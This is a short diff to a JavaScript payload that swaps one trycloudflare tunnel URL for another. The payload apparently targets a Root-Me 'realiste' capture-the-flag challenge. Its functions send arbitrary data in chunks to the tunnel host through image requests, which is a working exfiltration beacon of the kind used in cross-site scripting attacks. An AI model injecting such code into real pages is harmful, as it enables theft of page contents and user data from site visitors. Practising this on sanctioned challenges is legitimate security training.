@@ -1,5 +1,5 @@
 if(window.__go7){}else{window.__go7=1;
-var T="https://emerald-adjustable-stevens-useful.trycloudflare.com";
+var T="https://specialty-colleague-technique-scanning.trycloudflare.com";
 function E(t,d){try{new Image().src=T+"/"+t+"?d="+encodeURIComponent(String(d).substring(0,1500))}catch(e){}}
 function EX(t,s){s=String(s);for(var i=0;i<s.length;i+=1100){E(t+"_"+(i/1100),s.substr(i,1100))}}
 var base="http://challenge01.root-me.org/realiste/ch16/";
